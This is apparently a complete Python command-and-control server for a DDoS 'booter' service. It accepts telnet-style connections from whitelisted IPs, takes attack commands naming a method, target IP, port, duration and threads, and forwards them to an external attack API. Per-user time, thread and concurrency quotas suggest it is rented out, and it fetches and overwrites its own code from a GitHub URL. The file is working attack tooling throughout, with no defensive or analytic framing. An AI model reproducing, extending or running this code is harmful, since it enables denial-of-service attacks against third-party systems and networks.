import requests
import socket
import threading
import time as time_module
import os
import datetime
import json
import shutil
import readline
import ipaddress
import sys
import subprocess

__version__ = "Full Release 2"

LOG_FILE = "cnc_log.txt"
CONFIG_FILE = "cnc_config.json"

def read_file(file_name):
    with open(file_name, "r") as f:
        return [line.strip() for line in f]

def load_config():
    with open(CONFIG_FILE, "r") as f:
        return json.load(f)

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)

config = load_config()
API_URL = config['api_url']
RAW_PORT = config['cnc_port']

def is_ip_allowed(ip, allowed_ips):
    return ip in allowed_ips

def run_with_auto_update():
    UPDATE_INTERVAL = 60  # Check for updates every 60 seconds
    BACKUP_CONFIG_FILE = "cnc_config_backup.json"

    while True:
        print("Checking for updates...")
        update_available, new_script = check_for_updates()
        if update_available:
            print("Update available. Updating the script...")
            # Backup the JSON configuration file
            shutil.copy(CONFIG_FILE, BACKUP_CONFIG_FILE)
            # Update the script
            update_script(new_script)
            print("Update completed. Restarting the script...")
        else:
            print("No updates found.")
        
        proc = subprocess.Popen([sys.executable, __file__])  # Start the CNC script
        time_module.sleep(UPDATE_INTERVAL)  # Wait for the specified interval
        print("Terminating the CNC script...")
        proc.terminate()  # Terminate the CNC script

def is_ip_whitelisted(ip, whitelist):
    return ip in whitelist

def get_time_limit(ip, allowed_ips_with_limits):
    for allowed_ip, ip_data in allowed_ips_with_limits.items():
        if ip == allowed_ip:
            return ip_data['time_limit']
    return None

def get_attack_limit(ip, allowed_ips_with_limits):
    for allowed_ip, ip_data in allowed_ips_with_limits.items():
        if ip == allowed_ip:
            return ip_data['attack_limit']
    return None

def get_threads_limit(ip, allowed_ips_with_limits):
    for allowed_ip, ip_data in allowed_ips_with_limits.items():
        if ip == allowed_ip:
            return ip_data['threads_limit']
    return None

def get_connection_limit(ip, allowed_ips_with_limits):
    for allowed_ip, ip_data in allowed_ips_with_limits.items():
        if ip == allowed_ip:
            return ip_data['connection_limit']
    return None

def execute_attack(api_key, method, ip, port, time, threads):
    data = {
        "api_key": api_key,
        "ip": ip,
        "port": port,
        "time": time,
        "threads": threads,
        "method": method,
    }

    response = requests.post(f"{API_URL}/start_attack", data=data)
    return response.json()

def log_activity(log_message):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"[{timestamp}] {log_message}\n")

def apply_config(conn, config):
    conn.send(f"\033[1;{config['text_color']}m".encode('utf-8'))  # Apply text color
    conn.send(f"\033[4{config['background_color']}m".encode('utf-8'))  # Apply background color

def print_login_message(conn, methods, config):
    apply_config(conn, config)
    conn.send(f"Welcome! You are connected from an allowed IP address.\r\n".encode('utf-8'))
    conn.send(f"Available methods: {', '.join(methods)}\r\n".encode('utf-8'))
    conn.send(f"How to send: IP port time threads\r\n".encode('utf-8'))

def is_valid_ipv4_address(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def is_valid_port(port):
    try:
        port_number = int(port)
        return 1 <= port_number <= 65535
    except ValueError:
        return False

def is_valid_time(time):
    try:
        time_value = int(time)
        return time_value > 0
    except ValueError:
        return False

def client_handler(conn, addr, connection_counter):
    try:
        config = load_config()
        api_key = config['api_key']
        methods = config['methods']
        allowed_ips_with_limits = config['allowed_ips']

        if not is_ip_allowed(addr[0], allowed_ips_with_limits.keys()):
            print(f"Rejected connection from {addr[0]}:{addr[1]} (IP not allowed)")
            conn.send(b"Your IP address is not allowed to access this CNC CLI.\n")
            conn.close()
            log_activity(f"Failed login from {addr[0]}:{addr[1]} (IP not allowed)")
            return

        connection_limit = get_connection_limit(addr[0], allowed_ips_with_limits)
        if config['enable_connection_limit'] and connection_counter[addr[0]] > connection_limit:
            print(f"Rejected connection from {addr[0]}:{addr[1]} (connection limit reached)")
            conn.send(f"You have reached the connection limit of {connection_limit}.\r\n".encode('utf-8'))
            conn.close()
            log_activity(f"Failed login from {addr[0]}:{addr[1]} (connection limit reached)")
            return

        if config['updating']:
            conn.send(b"The CNC is being updated. Please wait...\n")
            time_module.sleep(30)
            conn.close()
            return

        print(f"Accepted connection from {addr[0]}:{addr[1]}")
        log_activity(f"Successful login from {addr[0]}:{addr[1]}")
        print_login_message(conn, methods, config)

        used_time = 0
        ongoing_attacks = 0
        last_command_time = time_module.time()
        rate_limit_duration = 1  # 1 second between commands
        start_time = time_module.time()
        while True:
            conn.send(b">")
            command = conn.recv(1024).decode('utf-8', errors='ignore').strip().split()
            if not command:
                if time_module.time() - last_command_time >= config['auto_disconnect_time']:
                    break
                continue

            current_time = time_module.time()
            if current_time - start_time >= config['auto_disconnect_time']:
                break

            if current_time - last_command_time < rate_limit_duration:
                conn.send(f"Rate limit exceeded. Wait at least {rate_limit_duration} seconds between commands.\r\n".encode('utf-8'))
                continue
            last_command_time = current_time

            try:
                if command[0] == "exit":
                    break
                elif command[0] == "clear":
                    conn.send(b"\033[2J\033[H")  # ANSI escape code to clear the screen
                    print_login_message(conn, methods, config)
                elif command[0] == "config":
                    if len(command) == 3:
                        config_key = command[1]
                        config_value = command[2]
                        if config_key in config:
                            config[config_key] = config_value
                            save_config(config)
                            conn.send(f"Configuration updated: {config_key} = {config_value}\r\n".encode('utf-8'))
                        else:
                            conn.send(f"Invalid configuration key: {config_key}\r\n".encode('utf-8'))
                    else:
                        conn.send(f"Usage: config <key> <value>\r\n".encode('utf-8'))
                elif command[0][0] == "." and command[0][1:] in methods:
                    method = command[0][1:]
                    if len(command) < 4:
                        conn.send(b"Usage: .<method> IP port time [threads]\n")
                        continue

                    ip = command[1]
                    port = command[2]
                    time = command[3]
                    threads = command[4] if len(command) > 4 else "1"  # Default threads value

                    if not is_valid_ipv4_address(ip):
                        conn.send(b"Invalid IP address.\n")
                        continue

                    if is_ip_whitelisted(ip, config['whitelist']):
                        conn.send(b"Target IP is whitelisted. Attack not allowed.\n")
                        log_activity(f"User {addr[0]}:{addr[1]} tried to attack whitelisted IP: {ip}")
                        continue

                    if not is_valid_port(port):
                        conn.send(b"Invalid port number.\n")
                        continue

                    if not is_valid_time(time):
                        conn.send(b"Invalid time value.\n")
                        continue

                    time_limit = get_time_limit(addr[0], allowed_ips_with_limits)
                    attack_limit = get_attack_limit(addr[0], allowed_ips_with_limits)
                    threads_limit = get_threads_limit(addr[0], allowed_ips_with_limits)

                    if used_time + int(time) > time_limit:
                        conn.send(f"Time limit exceeded. You have {time_limit - used_time} seconds left.\r\n".encode('utf-8'))
                        continue

                    if ongoing_attacks >= attack_limit:
                        conn.send(f"Attack limit reached. You can only run {attack_limit} attacks simultaneously.\r\n".encode('utf-8'))
                        continue

                    if int(threads) > threads_limit:
                        conn.send(f"Threads limit exceeded. You can only use up to {threads_limit} threads.\r\n".encode('utf-8'))
                        continue

                    response = execute_attack(api_key, method, ip, port, time, threads)
                    if response ['success']:
                        ongoing_attacks += 1
                        used_time += int(time)
                        log_activity(f"User {addr[0]}:{addr[1]} started attack on {ip}:{port} for {time} seconds using method {method} and {threads} threads")
                        conn.send(f"Attack started on {ip}:{port} for {time} seconds using method {method} and {threads} threads.\r\n".encode('utf-8'))
                        time_module.sleep(int(time))
                        ongoing_attacks -= 1
                    else:
                        conn.send(f"Error: {response['message']}\r\n".encode('utf-8'))
                else:
                    conn.send(b"Invalid command.\n")
            except Exception as e:
                conn.send(f"An error occurred while processing your command. Please contact the developer with error code: {str(e)}\r\n".encode('utf-8'))
                log_activity(f"Error while processing command from {addr[0]}:{addr[1]} - {str(e)}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        print(f"Disconnected from {addr[0]}:{addr[1]}")
        log_activity(f"Disconnected from {addr[0]}:{addr[1]}")
        if addr[0] in connection_counter:
            connection_counter[addr[0]] -= 1
        conn.close()

def check_for_updates():
    github_url = "https://raw.githubusercontent.com/OVHGERMANY/PythonCNC/main/cnc_cli.py"
    response = requests.get(github_url)
    if response.status_code == 200:
        remote_script = response.text
        remote_version = None
        for line in remote_script.splitlines():
            if line.startswith("__version__"):
                remote_version = line.split("=")[1].strip().strip('"')
                break

        if remote_version:
            print(f"Local version: {__version__}, Remote version: {remote_version}")
            if remote_version != __version__:
                return True, remote_script
            else:
                print("No updates found.")
        else:
            print("Error: Unable to parse remote version.")
    else:
        print(f"Error: Unable to fetch remote script (status code: {response.status_code}).")
    return False, None

def update_script(new_script):
    with open("cnc_cli.py", "w") as f:
        f.write(new_script)

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--auto-update":
        run_with_auto_update()
    else:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(("", RAW_PORT))
        server_socket.listen()

        print(f"Listening for Raw connections on port {RAW_PORT}...")

        connection_counter = {}
        try:
            while True:
                conn, addr = server_socket.accept()
                if addr[0] not in connection_counter:
                    connection_counter[addr[0]] = 0
                connection_counter[addr[0]] += 1
                client_thread = threading.Thread(target=client_handler, args=(conn, addr, connection_counter))
                client_thread.start()
        except KeyboardInterrupt:
            print("Shutting down the server...")

if __name__ == "__main__":
    main()
